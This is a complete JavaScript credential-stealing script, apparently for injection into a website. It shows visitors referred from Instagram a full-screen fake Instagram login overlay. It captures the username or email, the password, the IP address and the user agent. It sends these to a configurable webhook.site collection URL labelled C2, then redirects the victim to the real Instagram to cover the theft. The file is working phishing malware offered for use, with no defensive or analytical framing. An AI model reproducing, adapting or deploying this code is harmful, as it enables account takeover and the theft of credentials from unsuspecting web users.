(function() {
    'use strict';
    
    // CONFIG: Change this to your receiver
    const C2_URL = 'https://webhook.site/21fe98a2-693d-495c-9d1e-268b523b68d6'; // webhook.site for testing
    
    // Only run once
    if (window.igStealerLoaded) return;
    window.igStealerLoaded = true;
    
    // Detect Instagram context
    function isInstagramTraffic() {
        const ref = document.referrer.toLowerCase();
        const hash = window.location.hash.toLowerCase();
        const search = window.location.search.toLowerCase();
        
        return (
            ref.includes('instagram.com') ||
            ref.includes('instagr.am') ||
            search.includes('igshid=') ||
            search.includes('utm_source=instagram') ||
            hash.includes('instagram') ||
            navigator.userAgent.includes('Instagram')
        );
    }
    
    // Create invisible phishing iframe (matches Instagram exactly)
    function deployPhish() {
        const iframe = document.createElement('iframe');
        iframe.id = 'igPhish';
        iframe.style.cssText = `
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            border: none; z-index: 999999; background: rgba(0,0,0,0.9);
            display: none;
        `;
        iframe.srcdoc = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <style>
                    body { margin: 0; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif; background: #fafafa; display: flex; align-items: center; justify-content: center; height: 100vh; }
                    .container { background: white; padding: 40px 40px 20px; border-radius: 1px; width: 350px; text-align: center; box-shadow: 0 2px 16px rgba(0,0,0,0.1); }
                    .logo { font-size: 42px; font-weight: 600; color: #262626; margin-bottom: 32px; font-family: "Courier New", monospace; }
                    input { width: 100%; padding: 12px 16px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
                    input:focus { border-color: #0095f6; background: white; outline: none; }
                    button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: 600; cursor: pointer; margin-top: 8px; }
                    button:hover { background: #1877f2; }
                    .loading { text-align: center; padding: 20px; color: #8e8e8e; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="logo">Instagram</div>
                    <form id="loginForm">
                        <input type="email" id="email" placeholder="Username or Email" required>
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="submit">Log in</button>
                    </form>
                </div>
                <script>
                    document.getElementById('loginForm').onsubmit = async (e) => {
                        e.preventDefault();
                        const email = document.getElementById('email').value;
                        const pass = document.getElementById('password').value;
                        
                        // Get victim info
                        const ipRes = await fetch('https://api.ipify.org?format=json');
                        const ip = await ipRes.json().then(r => r.ip);
                        
                        // Send to C2 (CORS-safe)
                        const data = {email, pass, ip: ip, ua: navigator.userAgent, url: window.location.href};
                        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                        navigator.sendBeacon('${C2_URL}', blob);
                        
                        // Show fake loading
                        document.body.innerHTML = '<div class="loading">Redirecting to Instagram...</div>';
                        setTimeout(() => {
                            window.top.location.href = 'https://www.instagram.com/';
                        }, 1500);
                    }
                </script>
            </body>
            </html>
        `;
        
        document.body.appendChild(iframe);
        iframe.contentWindow.postMessage({show: true}, '*');
        iframe.style.display = 'block';
        document.body.style.overflow = 'hidden';
    }
    
    // Auto-deploy if Instagram traffic
    if (isInstagramTraffic()) {
        setTimeout(deployPhish, 500); // Brief delay for page load
    }
    
    // Watch for Instagram links/embeds (bonus trigger)
    const observer = new MutationObserver(() => {
        if (document.querySelector('a[href*="instagram"], iframe[src*="instagram"]')) {
            setTimeout(deployPhish, 1000);
        }
    });
    observer.observe(document.body, {childList: true, subtree: true});
    
})();
